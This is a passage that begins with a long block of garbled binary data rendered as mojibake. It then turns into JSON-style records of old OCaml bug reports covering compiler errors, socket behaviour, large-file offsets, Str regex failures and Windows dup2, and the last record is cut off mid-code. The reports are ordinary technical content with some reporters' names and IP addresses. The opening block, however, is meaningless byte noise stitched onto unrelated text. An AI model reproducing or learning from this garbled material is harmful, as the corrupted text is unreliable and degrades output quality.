âÂ»PxVHÃ©x:K?Ã¬â¢|PÂ¬$Ã»5l`Q`hqRË\u0011\u001eK-ÃÂµBDhâ¦>::'\u0015Ã_\nÃªÂ°ÃÂ¨*O\u0000\u0015Ãµ&Ã¦IÂ¬5Ã±/Â¢Ã¸\u001fÆ$Â«Â \b â¦2?Ã­M?Â±.\u0016\u000fËâd{â°?Â¯`I8ÃGÅ½Â¾\u001f`qZÂ¸â°l#\u0011sÃ­UÃ§,\nÃÂ´ÃÃ¡Ã«Ã©ÃÃ¹âºÃrE\u0013\tÂ¾Â§\u0014Â²ÃÃ\u0016<\fÃ¡Â¯Ã°\u0019âºÃ­}ÃÃ±Ã¹ÃNÂ´âÃÃ5âxÅÃ½Ãº+Ã£Ã\"f?UâvÃ¨Â¨Â·\u0003\tQÂ¬Â´Ã¬ZÃ«âÂ£\u001aÂ¬\u0018e\u0019[Ã¯\u0013ÃLÃÂ·;^\u001cÃ¥)Ã¤ÃÅ¡1Ã*Ã¯aWgÂµâ¢Å Â·pÂ£+Â¬kÃ0Â¾Ã\u0004âÃÆCÂ¨WÂ Ã\u0007Ã¾ÃªÃ±\u0018â¢Ã\u001fÂ¢Ã¸\u001aR\u000eÃMÃrS<?\u0003\"_`Ãâ¦\u0007â\tÃ·Ã(ÃÃ*Â£3Ã¦VÃ«ÃMÂ£Ã\nÃ\u0007EÂ¸Ã*ÃªÂ¤Â¢Â¬*|Â°\\,\u001d?\u001cÂ¹b2\u001dÃÃTÂ¢ÃºvÂ°ÃÂ²fo\u0006BÃ²?Ã Ãªd\u000bÃÂ¢Ã\u000755U\u0003Å½\u000fÃ¹Ã¬xËMÃÂ¾Ã´Ã¼Ã\u001a\u001b]\u0011vY`zÃ§ÆÂ³ÃÂ±*$Ã\u0015\u0019}ÃâÃ¸Â¾â¦oË<Ã°Ã­ÃÃMY\u0011@ÃzomÃ\u0017Ã\u0017uÃ¢â°jcÂ¸\u0016Ãvjw0Ã»e8ÃÃ­Â¦\u001fÂ¤Ã°Â­ÃÂ³Ã±\"TÃÂ¬s:ZgvÃ\u0000Â·@\u001a\u0004VNLÃÃ®!ÃÃ¡vS\tÃÃ®<iÃ»Ã¦\u0000ÃÃºÃµÃ©Ã\bÃÃº\u0011â =Ã8lÃ»?IvÂ´FÂ¶Å¾Ã±Q=YÃy\rÃ«GoÃ'\u0005Ã:\u0016!ÂµÃÃ­ufÃÂ­1s[ÃÃÂ»zfÃ\u00113Â·kÃTÂ¡\bË$!Â¹|Â·?Å\u0000\u0004Â¹m aÃ²/ÃÂ©Ã?Ëf\rÃ¿\bW3 tÃ·\bÃ¥NÃ¾\u0011Å â¬ËÃ¿~Il3Â¹'b+Â¥Ã­m Â´Â°-Â¨Ã?âÃ}tââº\u0001Å -\u0005Â¨xXG\u0014\u0003T\u0005Â¨Â¿Ã\u00174Â².ÃÂ¾*Ã«5YV\u001dÃ\u0010Â«Ã \u001fâj\u0018Â¡\u0017Â½Â¶whp^â¡RÃ´ÃµÂ´Â¡L4\u000bjfÃ§Ã¼Ã¨Ã¬Â»Ã9DÅÃ§ËÂ¥LÃ.Å¸Ã\u0015Ãbf?[\u001cÃÃ¨Â¬\u001cJ\u0018Â²]<\rÃGÂ­Ã·?z$2d\u00153]Ãâ¦t|\u0014Ë\u001aÃFÃa\t[\u0001\r*Â°\u0010â¢\u0007ÃÂ¡\u000e+Â±{\b|ËÃ«\rÅ ÃdÅ\u0001.4Ã®?\u001fâºÃ°8Ã»SÃJ?!Â¦W4l\rOÂ§#\u0010Ã§Ã¸Ã¼D\u0011!Â²Ã¤Ã²Ã!}Â·\u001dÃÂ®?ÆÂ´Ã]OÃ¬9 Ã\u0012bCÅ¾Ãn^Âº\u0019Â§[PÃ*Â·Ã­Â¶Â·\f6Ã´ÃÂµcâYDÂ°\u0006pâ¢Â±Ã«ÃÃÅ¾Å¾BÃÂ¹ÃÂ·âÃÃ&p\u001cÃ \u0010Â¾n\u0010Pâ¬ÃÃ\u001b(ÃÂ²Ã¡Ã´O'ÂµÃ Ãµ\\\u0003Ã¸E\tÂ®\b\u0018LÂ /?â Ã£Ã¯Â«Ãâ¦âÂ¬Â»Å¡Ã°DÂ±\u0003Â»?Â Ã¦\u0012\u0013\tÃ\u0018Â°Â¾Ã¯ÃÅâ°Ãªâ¹Xx{w!@ÂªâÃ©Â½X\fÃÂ´Ã.Å¸ÃÂ²\u001a\u0013~uÃ¿Â£\u0018?Ã¢@?ÃÃ¶Â©\u0012\u001eÃ«mUzÃÃ¶ÃµÃ«Â£ÃÂ `Y\u0002ÃCÂ±Â»?cEbS\u0007Â¯\u000b&ÃºÂ¼Ã­\u001d[Ã/Wsâ¡J\u001a\"Â©Â¢nKÂ¡A[UÃÂ°\nâºMÃGÂ§jd`Ã@Ãbk<\u0019ââ\u0012Å¡@?k\u001aÃÅ¾/â2HwÃÃBÂ£]#w]BÃÃ5$\u00046cvâÃ¬\u0003Â¥Â­Â­R:\u0014\u0011ÃTÃ-\tx#â¹Ã¸bgÂ¿ÃeËâº\"OÃ\u0012Ã®Â­sâ¡Â£*Â¾+\\ÂªÂ¦|Â®cÃ8,XÃ£Â­bH?ÃÂµX~âÂ§Â®Â¼\u001câ¹{Nt+ÃâWÃ¯pÂ¯\u001e+z\u0018#\u0003\u0014MS\u0015ÃÃ\u0004Â§ws<~ÃÃ¤\u000bmeâE6+Â´NÂ¤ÃÃ¸Ã¥06./â tâ\u0004+\u000e\\uâ¬\u001bÂ·h\u0013wÃPÃµ</?ÂµXcÃ\u0002ÃÃ³ÃXY+Â¬l<\bÂ¡hÂ»Ã¸jaÂ¿iÂ©)\u000f\u0004ÃÃ²R_qnXjÅ Ã­\u0001Ã¤h(Ã·Ã¥â°Â¡aAÅââ¹8Â°Ã¹Ã|-Ã¹-@H\u0003ÃJÂ¢Ã·Ã¤\u0010H>!_\u0011\u0007\u0010ZÃÃºÂ¡ÆziÃµÃ¯Â¦Â¸FÃ°.zH\u000eÅ`3Â¹\u0011aÃ\u0013âÂ²Â£Å¾\u001cÂ¼+w&Ã&Â Ã¡Ã¡Ã¸;âÃ¢Ã¹â°Sn\u0002\u0016Â«â¹~Pâ \u001bÃÃ¢Ã¨K\u001eÃÂ Ãº6Â LA?IÃ\"Â¾mÃ¹Ã³'Â¹âºM[\u0017Â°ÃÃ¥Ã¢Ã¤)[%Ã¤]I\u001aÃÃNÃ¬Ã¥m.~JÂ¡Â¶Â¿Ã±@*_Ã eÃÅ5oy\u000eÃ©â¬,\u0018+\u0002vMgK\u001eÃ¾Ã¦ËÃÂ¯1ÃâVÅ*Ã\"Â¸ÃÃ§\u0014v'~Ã´1-Ãâ¹Ã§lÂ¹\nÃ³@\fA\u0007\u0017â\u0001bÃ°â\u0017LÅ C\rÅ¡â¬ÃâºWÃÃ¬2N\u0018\u001bÃ¥Ã²XÂ¡?9=?Å\u001dÂ¹!,d%\u001bÂ¨\u0012ÃÃ\u001bÃ Â¤Â³Å fÃ\u001bÃg}Ã²3ÃÂ®AoÃ~\tÂ¢Ã´Ãº\u0018âËrÃÂ¯@n[âÂ« âÂ§Ë^GÃ­Ã§2Ã?P\u000eâ°âºe Ã¤[y\u0006âGâ}Å gPbÃ´ZÃÂºÂ©n?\bÅ¾Â·9âÃ©Â¹â\u0006Âµ\u0005Æ\"Â Ã¨\f\"Å½v\u001e*7Ãµ\u0017xÃÃ¸\u0014ÂºÅ¸âÃpÂ¨\u0013Ã®&+D\\\u001e\u001cÃâ¢âEÃ¼â\b{t>?Â§\u0018Å\u0001Ã\f\u001b3#Ã²Ã©â°W?H\u001c`Â«\bââ Ã½\u001bâÂ´Â±Ã¯A\u0017Ã¶%ËTHlDâÃÂ§Ë\u000f^B2Sw;ÃÃÃuÃZGâ¢M\u0007Ã½Â¡ÃªÃ\fW?Ã¶âPÃtÂ´Â²ÃpTÃ¸P\u0000XjË%Â¡Â­Â¿\u0012ÃpÂ¥\u0014Â¦Ã¨Å½/Ã¥E\u0002Â¬!â Â¬P\u0004Ch_ËâÂ¾\u001fË5â¢\\ÃÃjËr&-oËâ°Zâ¢Âªâ¹\u000fÃ¢Â¤SÂ¸ÃÃÂ¶Â±â¦Æ\u001dÂ«Â½\u0016Â­LÃÃÅ¡@Ã³Ã°\u0016\u0014e` \u0006Å\u0018@\u0005ÅjÃ¨Â°ÃÃ?Å¡Â±Â±Â®\u0015Â¡ÃÃÂ°RÂ¾m7XÂ£ATuFÅ¾Â£Â¥Â®Â²<^ÃªÃT (\u0015\t}*Ã½ÃÂ·EÃ»uÃQ\u0013â¡â¬\u0005ÃÃ«e6BÃÃuâ¡k\u001bÃ\fE`(âÂ¢Ã§â*Ã³\" 3Â¼ELÂµÅÃ\u0001Ã¸LÃ°ÃÃ%I]Â¼/'Ã»xÃÃ¬#7\u000f>JÃ7sâºÅ¾\u000eÃ¯Â±%/âÅjÃNsÃ³z\u0002ejÃD\u0003@teÃ{ÃÃ]ÃsÂ±Ã{n,uH*\u0006:\u001eÆÃ¡Ã¿\u0000UÃÃ¤xâ¬j,?Zw1Ã\u00122Â»ÃÃÃÅ¡Â«U<\u0001V\u0013Å¡al6ÂµZÃ2Ã®NÃÃ«Â¦VkZÂ¬â¦g?Â¥b+^Â¿fÃ¾Å¡Â±ÃÂ¸Â¶Ã©?w\u0019hipr\u001bFÃ£jÃÃ kÃKÃÂ¾ÃmÃ»Ã5Ã¢ÃÂ½f.Ã¹EÃ\"Ã®jÃÃP\u000bâ¢oâ8Â«Â¨hÃËmUÃÂ£79>Op\u0011S\\\u001aÃÃ$M\u0004Â¥Â oÂ±â¢ÂµÃC\u001eÃÃâ¦Â¢3vÃ¶âVc?Ã\u0015?xJ\u0017\u0005â¹Ã¼ÃÅ¡Ã²Â¢âm\u0015}=\\ËÃªÂ«\\Ã¼}Ã´Â·â{Â¨_SÃÅ¡+aÂ©c4s;\u0001\u0017â¢[[Ã\u0001ÃaC{Ã(Â¥sx\u000b+Â«KÂ¯Â·UÃ¦Ãâ?V\u0014cÃ¹ÃÃ»\u001dÃ\bÃÃÃG\u0014jÅÃÃ¡-+?\u0013?ÃÃ¯\u0012â°Â¶ÃÃ²Ãx1âÂ¥GeKkÃ¼N=?Ã¯ÃÃÂ¸Ã¤I{/\\\u0007ÃÂ«\u000b\u000bÃ{âÃ³\bÂ´Â¹â°Ã¡?IÂ£ËcÃÃ»:âºâº<Â¦Â¨Â¶5Sâ¢Â·\u0007ÃÃ\u0004KÃ¦\u0016â¹Â¹ÆtÅ¸Ã©ËÃ·e,ÃYÃÃÃ´Ã3\f\\2Â½ÃÃÂ´â¢ÃªÃyÃ Â¹VvÃ\u001eFÃÅ¸ ÅÃÂ«hÂ½\u0010â¡Â¾mUo\u0002Â¸ÃYÃ\u0011ZÂ¿Ã\u0015Ã¯Ã<Ã®Â®~Å¡Ã¦Â«JÃ¶u%#Â«\u001b\u0015Å/u\u0011ÃL\u001eZÂ­\u001b'Ã²â¡Ã½Ã7\u0015Â¨Ã­?ÃÂ«?vJÃ¨Â§vWÃ¢~T\\ÃµÂµÃ\u001fÃ }ÃÃ¬'Â¡Ã\u0012Ã¢Â°ÃÂº2Kââ \u000e#â¹#\u001dJ\u0015V\rÃâ¡ÃÂ«Ã¿âÃ°Å¾Ã¸ÃµiÃ²Ã¸kc[?Â°j?Ã»Â¡$\u0018Ãª\"Â¬\u000fâÂ¥(Ã©*Å Ã(Â³Å Â§ÃÃ§+Â¥Å uÃaÃ£Â¶ÃM\u0012Â¬Â¯jXÂ»Â£Ã(Â¡Ã¿Ã¿U\u001bÅ¸0Ã¡ÃËÂ°1Â³Ã»2z?ÅÃ¾ZÃ»Â¯âºÃ®'$Â·âRÃ½\u001dÂ³Ã¹âÂ¤_+ÃÂ¿8Ã½ÃÃÃ£\u0001Å ?$2Ã¥U[\u0017Ã¨\u0012{s~:jÃ¹Â±Â·Ã\u000bÃ\"d.rhCÃ´ËÂ½Ã\"_VÂ²Ã®\boOV\u0010BÂ·@\u0010â+\rÅiÅÃ¥3/\râÂ¼ââd&Z\u0007Å¾ÃIeÃ0=>Â©Â¢Ã¹Ã³:<Â¿â-Ã±Â§Ã«Ã¥v>&\u0004Ãºqâ¢I\u000b\t1Å¡/Â£I0Ã¢â°â°!\u001ez\r;Å¡Ã¼ÃFÆ\u001f\u0006#Âµ?E\u0003*Ã¬ÃÃ®\tâ¹Ãw{ÃÃ³Ã³Â­\u0002@]Ã47$\u0004Â°Ã2Â¶Ã±nÃ¼Ã¶Â·Ã¢T]Â³WI]??ÃNÂ½Ã¹Ã\u0003Ã¼m\u0019Ã¾?\"ÆH\u001e\u0010Â°V\u000bÃ¤#Ã·Â¡_Â³Ã\u0003Exâ¢Ã±pÅ½\u0003Â¤Kt\u0016:Â³KÆÃ¥?Â´{\u0000ÂªÅ¡QÃÂ¦Ã»fjTÂ®Â¦âÃÂ²Â´Â»WPÃ¥Å½âÃÃ´â.+sK^Ãâ°$Ã\fiIÃ¾Å¸Ã¨WÃ­?M_Ã¥?Ã¶ÃÂ£.XÃ¤?Â ÃÃbÂ®Æ\u0019LâÅ½Ã Ã±Ã®\u000f?Â¾Ã£6=Ã­62\nÃ¿\"Ã¨i\u0014Ã®Â¸ÃAââ Ã>ÃÃ°â¢~Ã¾MWCÃ\u001eÃ.sÂ±Ã¶âÃ¡M\u0007KÃb'ÃWÂµ\rÃÃÃ\u0016nÃqâºÂ®Â¯Ã¯n\u0015Ã§ÂªUÃ½Â®\u0019\u0000\u001e\"Ã¡Â¡âe\\-ÃÂ gyFPÃ§â-Â·ÂªjÂ¥ÃÂªÃÃÂ·Ã\rÂ­[\u001bÃ¯2âbÂ«q\u0006ÃÃ²0}ÃÃ°cpR0gnÃÃÂ¸?Â¥Â¥Â¼\u001e3Ã`Å¾Ã½ÃsÃ\"Â¯jÂ¸)KÂ½Å 2Å âÂ©\u001bÃÃ¡ÃÂ·ÃsÂ±Ã»ho!Z\u0007bM|\u0015Â³\u000e\u0015ÃÃ¹mÃ{ÃGÃâ°WyÃÃÃÃ¥Ãâ¢?VuÂ¡Â«G\u0015Aâ\u001cÃ¾\u000bâ¬ÃÅ Xâ¹Â³Â§YÂ§Ã¹Ã¾YâÂ°Ã·ÃÅ¸Ã¾Ã§ÃÃÃÃÆ\u0014Å¸Ã?Ã·Â»?Ã¤Â«?eÃ_Ã¿Ã«+!ÃÃ¿kÃ¯ÃvÃ6â0|Â­}Å Â­aÂ¤R \u000biâ\u0006â¦l\u00141Åâ?Ã.ÅÃº\"hÅ âÂ¢(â¹Â±I\u001a\u0012\u0015ÃÂ½Ã¨Â³wfÃ¶Ã%E9vÂª\u001cÃ½/`â¹\u0012ÃÃÃ¥Ã¬âÃ¤Ã¬Ã¿Â¥\u0013Ã½Â§ÃÃºGolnÅ¾Å¸oÃ¨Â¿Â¶?Å¡Â¨Ã¬ÃÃÃ§Â¡Ã¾.MoÃÃÃ§Â¹Ã¶`Ã¿Â¤Â¼Ã­1Ã»ÃÂ¶;Ã¬ÆÃ5\u001f\u000fÃ»Ã[Â¢\u00135SÃÅ Ã¬nÂ±\u001dÃ¤\u0002ÃnÂ¬ÃÃ»\rsÃâÅ½ÃÃÂ¯-Ã¶ÃMbÅ¾Â¤RÂ Â¦Ã«Â¢ÃÂ Â£2?_ÃÃÃ¢Ã\u0017wÂ½Â¯ËmÃ\fÅ¾Ã©7ÃÃ³6Ãâ¡\u0005Â¶\"Â¹Zq\u0005fÂ¿]&jâ¦Â²ÃºTÂ±;MÂ¯Ã·Ã¶\u000f?y\u0010a7IÃÃ¿x\u0012 NÂ¤AgÃµÃº9;Â©Ã­,Å¸aÅ2UÂµiÂ¿\nNÃ¦â¦S\\Ã¸o|\u0016VÃÂ£Â½â¡5}Å¸ÂªU;Ã¤\u001cÃ¶w\nÂ§\u0013Âµ\u0017Â³v\u0015âTÂ¹gÂ¯\u001b]}Â¸\u0006CrÃÃJÃª\u0007Ã»iÃ¹ÃQ=_IÃb\u0011OÃµÃ¦Ã½Ãt[â¹ÃÃ¢Â â\u000eÆa.Â®ÃÃ¢ÃÃ:v|Âª-Â¤qâ¢ÃqgÃ¼}ÃÂ£Ã¾T\u0005#lK\u001a<Ã®Å¡DÃ¬bÃ?MÂ¦Ã¡\u0018?4Â¥Ãv?ÂªIw.Ã¼Â´â ÂºÃ¿ÃÂ¬Ãj&ÃºAoÃ±8Ã¾Ã´YeÅ¾Ã¬ââtÃâºUÃºYLÃ´Ã\u001aÂªÂ½>Ã{Â³;ÃÂ¿R~[ÃZxFÂ­iÂ¬:â¢KÂ¸Ã¡ÂªÂ­\u001bÂ®ÃÃ^Ã©Â·g0Ã·^Ã¹cÅ\u0017Å¾Ã­;Â§\u001b[ÃÃÂ³\u000e9\u001eÂ§Ã¹@s\u0002Å¾Ã©Ã&<âÃ¨TfÂ¡/.Ã¥CnW|Â¢ËÃOÃÃ\nÃº^=:Ã¥o=?*\u001d9Ã³&\tÃ±\u0014ÅÃ¯mÃ¥âÂºyâº<ÃÃÃ½v'\u001eWÃÃ´Â½{l\u0010Ã±\u001bÃ£e?=\u0017ÃMvÃÂªÃÅ¾ÃÂ°yÃ¢ÃÃÃ¯Sâ¢\u0011vÅ¸Â¾Ã¨-ef<\trÃ£nÃ£â2ÂµÃ5Â«\u001f9Ãº\u001dÅ½eÂ½Â·ÃÃÃ£ÆÅ¾[S(7ÃÃºÃÃ¡\u0011;Ã³\u001eÃ­\u001eÃ­Ã³Ã­Ã¶Ã Ã·Wâ¡\u0007oâ Ã¼`ÃÅ \u000bÂ¨jsÃÃ¡Ã¯Ã<Â¼\u001cÃ´Â¾ÃaTTÅÂ¦FY\f]â°â¦Ã«\u0010{oÃ³\rÃqÅ \u0005Â¦%.\u001fÂ¤:Ã¼â5Ã¥;5Ã±FÂ¨Ã¹\u0018SÃ»\u001c\u0017Â¦\u0010LKÂ£JÂ´â¢â ÃLÂ¼\r\\\n4Ã¾fÃºÃâÃ?Ã¥Â¨Â¶ÃÂ¶Ã9âT6DQÂ³Ã¥Ã¢Å<Ã|\u0011Â³Â¼ÃdqÃbÂ£5C-Ã²ÃTÃ¾ÃÂ°\u0016ÃÂ±Ã»94\u0015Ã·PÃ\u0018+nÂ·ÃÂ¶Â¦\u0016Â´ÃÃâ¹ÃÂ¬Ã[2SÂ¯=Ã¥Ã¶Ã«XoÃ½Ãºmâ&Â¦Ã´Â·{Â°Ã·Ã=ÃÂ±âÃªËÃ²â¦âÃ¿CeÃ¯Â«iÂ®ÃªÅÃ«iâÃ0â\u000eÃÃ·Ã¼AÂ§Â¯ÆÃ±Â²\u0011ÃµÃ¢\\ÃÃ zÃ¯Ã­Ã½Ã¢7Â¢\u001dÃ¼ËMÃ¹Â­Â¡?GÅ¾âÂ¹#Ã³b\u0014ÃÂ§â\u0015Â·Ã¡Ã³r0Å NÃµÃ½icLÃ»Â¿Â´6Ã]\bMÃ½7v\u0015ÃâAyYÂ®/?\u000fÃ©Â¿Ã¿Ã¼Ã°ÃÂ²Ã¾#Ã´Ã>KPÃ»zâÅÂ¥ÃÃ»DÃ¯\u001bÃGÆ\u0005â°ÃÃ@~0(Ã¨\u0002KÂºp2Ã\u0003\u0011ZÃ£\u0015,Å ÃªÃÂ¼ÃÃ»\u0014?uÃ½Å¾'If%ÃxÃ9oÅ \u0004lZÃªâ¹Â©aÂ±XÂ¥XÃÂ­Â©ÃÃ¶Â´Q]9g|ââ¢Â¡ÃOy5LÃ¥ÃÃ¯W\u0000ââ¹YNÂ»(+JÃ½aâ¢Ã«ââ¦Ã«Ã»VÆÃÂ¸1\u0017\u0014\rÃ­xGW2ÃÃJÃ¬TÃSâ¢Ã²qORÅ¾-Ã²?Â¾ÃÂ­d0{\u0003}Ã\u0018\u001dwÃÃ²Â¥Ã\u0011â¡Â¹>Â¢ÃÂ½Å JÃ½ÃÃÂ¨tâºâ¢\f?\u0006\u000fÅ¾Ã´CÂ±Ãâ¹âLÃ£\u0014s\u0015Ã£ONÃ¼âº\u0005-Â¾h\u00032Ã­,ÃâlD\u0019Â¡BÃ¢\u0001RÂ²Ãk\u0012?@?\u001dlALÂª,Å >â¢\u001f+jÃ\\Â¡\\Ã¤dâÂ³+Å $ÃÃ\u001dÃ\u0017Å Â±Â´â¹Ã«Å6ÆXÅ\u0014_^\\?}Ã\" âÃ£Ã,ÃÃ°\u0005U[qÃ¡Å â¡bÃªZ\u0001?ÂºlÂ¨ÆÂ°Ã¨ÃÃ¢Ã\u0006qÃµLGs^PE\u0005âÅ]F\fp Ã²ââÂ¸Ã'gi\\Ã¶Ã,â¡Â«â¢\u0013âÃÃ8Ã¡Â©\u0010G/\u000fÂ¶â¢]â`Å½Ã K8câI4Ã¢Eâº\u001c5%Â²âº_]DW}Ã\"Â²(?NÃ¨2ÃbÅÂ½Â±\r!Â¼hcÃ­}â\u001aÃ¿Â±TÂ¾Â¨8ÃÃ¤2Å KÃazÂ²Ëâ¢B\u0015\u0001Â¬,\u001a'&Â«Â³Ã?Â¡(\\Ds}ÃÃ?bÂ¢#5JOXâÃÃ\u0019ÂºâuMÂ ÃÂ¬Â¡x\"\u0018iÃ£Â³-Â¯oÃ¥â¦eâ-h\"SÃÂ¤\u001aÂ«TÅ k\u001aÃÃ¤Ã¥â¢ÃÂ¤Ã )ÃÃ·)sÂ¯ÃÅ Ã³ÅÃ&Ã¥â+Ã@Â¿*.Â¨7ËÃµk\u0017Â¨8âTÃ­Ã&Â¦Æ0Ã¦Â¢Ã«0â\u0013+ÃÃut6Ã§ÃOv\u001bÂ«ÃÅ mÂ­a\u001beÅ¸Ãª9\u0015H,\u0002Ã»>\u001eÃ¡\u0011Â¬Ã{QÃ³Â¾LÃaâ¹Ã§ZÃ5ÃdÃ¬Ã¥Ã\u001e5Â¹â¡la[\u0003\\Â½?Â±ax\tKÃÂ«thÃS*NÂ£Â¢Â¯ÃªÃ\tÂ½Â¥ÃÂ½âºÃ\u0017M\u0019?c*Ã¥ROâ¦\tÃÂ©Ã~VâÅ^?fÃ©x@w?_ÂºKÂ¿U\u0000Ã¿Ã¯Å½?Ã¿Ã Ã¿?Ã¿\u0007Ã¾\u001fÃ¸Ã Ã¿?Ã¿\u0007Ã¾\u001fÃ¸Ã Ã¿Âµâ¡Ã¯tÃ¾\u0007Ã¾\u001fÃ¸Ã Ã¿?Ã¿\u0007Ã¾\u001fÃ¸Ã Ã¿]sÃw:Ã¾ÆÃ¿wÂ·\u0003Ã¸_wÂ»Ã½Â¯ÃÂ·Ã¥Ã\u0000Ã¾ÃÅ¡Ã¬\fÃ¾\u0017Ã¸_Ã ?Ã¿\u0015hf*Ã°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿Ã²'â¬Ã¿\u0005Ã¾\u0017Ã¸_Ã ?Ã¿Â¥ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÂªÂ¤ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿RÃ ?Ã¿\u0005Ã¾\u0017Ã¸_Ã ?Ã¿\u0005Ã¾\u0017Ã¸_Ã ?Ã¿\u0005Ã¾\u0017Ã¸_Ã }=Â³\rÃ°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿\u0002Ã¿\u000bÃ¼/Ã°Â¿ÃÃ¿\u0002Ã¿Ã«kÃY?Ã¿uKÆ?Ã¿\u0005Ã¾\u0017Ã¸_ÃÆÃÃ¿\u0002Ã¿\u000bÃ¼/âÃµ\u0004Ã°Â¿Ã®Â¶Ã¾\u001bÃ¸_Ã ?Ã¿\u0005Ã¾\u0017Ã¸_Ã Ã±Ã¸_uâ°Ã«KÃ£CÃºÃ4Ã/?Ã¿?aÃ¼Ã¿\u001cÂ¡Â¡Ã¿Ã¬Ã\u001f\rÃ½gÃ³Â»jÃª6CÅ¡\u0019\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001Ã¡[\bÃ¿\u0001Â­=?d\u0000Ã°\u0000\u0000----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1515\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Dominique Quatravaux\nVersion: 3.06-1\nOS: Linux\nSubmission from: sete.idealx.com (213.41.87.82)\n\n\nI am using RedHat 7.3 and the ocaml RPM from\nhttp://caml.inria.fr/ocaml/distrib.html\n\nI created the following file under name helloworld.ml:\n\n  print_string \"hello world\\n\";;\n\nI compiled it using:\n\n  ocamlc -o helloworld -custom helloworld.ml\n\nThen I ran:\n\n  ./helloworld\n\nResponse:\n\n  Fatal_error: section `IM' is missing\n"},{"labels":["bug"],"text":"**Original bug ID:** 1514\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHere's a little bug.  The source-file \"bug1.ml\" is attached last.  In\nthe real file which elicited this symptom, of course, there were no\nuniversally-quantified variables.  Every variable was of some ground\ntype.\n\nAt some point, I might go dig into the toplevel and find this puppy,\nbut on the off chance that I do not, I figured I should report it.\n\nCheers,\n--chet--\n================================================================\nbismarck:~/fs/TOOLS2/src/rdf> ocaml\n        Objective Caml version 3.06\n\n# #use \"bug1.ml\";;\nval ntconv_node : 'a -> 'b -> unit list = <fun>\nval ntconv_edge : 'a -> 'b -> 'c -> 'd = <fun>\n# #trace ntconv_edge;;\nntconv_edge is not a function.\n# \n================================================================\nbismarck:~/fs/TOOLS2/src/rdf> cat /proc/cupinfo\ncat: /proc/cupinfo: No such file or directory\nbismarck:~/fs/TOOLS2/src/rdf> cat /proc/cpuinfo\nprocessor       : 0\nvendor_id       : GenuineIntel\ncpu family      : 6\nmodel           : 11\nmodel name      : Intel(R) Pentium(R) III Mobile CPU      1200MHz\nstepping        : 1\ncpu MHz         : 799.331\ncache size      : 512 KB\nfdiv_bug        : no\nhlt_bug         : no\nf00f_bug        : no\ncoma_bug        : no\nfpu             : yes\nfpu_exception   : yes\ncpuid level     : 2\nwp              : yes\nflags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 mmx fxsr sse\nbogomips        : 1595.80\n================================================================\nbismarck:~/fs/TOOLS2/src/rdf> uname -a\nLinux bismarck.chet.org 2.4.16 #1 Wed Aug 28 01:02:27 EDT 2002 i686 unknown\n================================================================\n\nlet rec ntconv_node stk e =\n  (assert false : unit list)\n\nand ntconv_edge stk subj = function\n    _ -> assert false\n"},{"labels":["bug"],"text":"**Original bug ID:** 1513\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Nicolas Cannasse\nVersion: OCaml 3.06\nOS: Win2K\nSubmission from: abordeaux-103-1-20-136.abo.wanadoo.fr (81.50.41.136)\n\n\nEn utilisant input_line sur un socket avec la bibliothÃ¨que Unix,\nil m'arrive d'obtenir un Sys_error(\"Invalid argument\") lors d'une lecture sur un\nsocket dÃ©jÃ  fermÃ© cotÃ© client ( nous sommes ici cotÃ© serveur ).\n\nCe comportement :\n1) n'est pas documentÃ©\n2) devrais plutot aboutir Ã  un End_of_file\n\nNicolas\n"},{"labels":["bug"],"text":"**Original bug ID:** 1511\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Hideo Bannai\nVersion: 3.06\nOS: Debian Linux (testing, x86)\nSubmission from: oteaa151.246.ne.jp (61.206.226.151)\n\n\nLargeFile.pos_in seems to return a negative value when the file\npointer exceeds size of 31 bits.\n\nMy friend says the problem is probably in\n        ocaml-3.06/byterun/io.c  \nwhere\nCAMLexport long pos_in(struct channel *channel)\n+CAMLexport file_offset pos_in(struct channel *channel)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1510\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: mattias waldau\nVersion: 3.06\nOS: cygwin and linux\nSubmission from: h13n2fls34o849.telia.com (217.208.235.13)\n\n\nStr.global_replace empty_rows_pattern \"\\n\" str ;; fails for the sample file\ncrash.ml,\n\n[mattias@pfour excel2ocaml]$ ocamlc str.cma crash.ml\n[mattias@pfour excel2ocaml]$ a.out\nFatal error: exception Failure(\"Str.search_forward\")\n(Program not linked with -g, cannot print stack backtrace)\n[mattias@pfour excel2ocaml]$ \n\nThe file crash.ml.gz can be found at \n\nwww.xleverywhere.com/tmp/crash.ml.gz\n"},{"labels":["bug"],"text":"**Original bug ID:** 1509\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Thomas Ball\nVersion: Ocaml 3.06\nOS: Windows XP\nSubmission from: 131.107.3.79 (131.107.3.79)\n\n\n(* I am trying to redirect stdout to a file under native Windows *)\n(* but am running into the following problem: the Windows version of *)\n(* dup2 seems to be incorrect, as the following code shows*)\n\nlet main () = begin\n  let ochan = open_out \"test\" 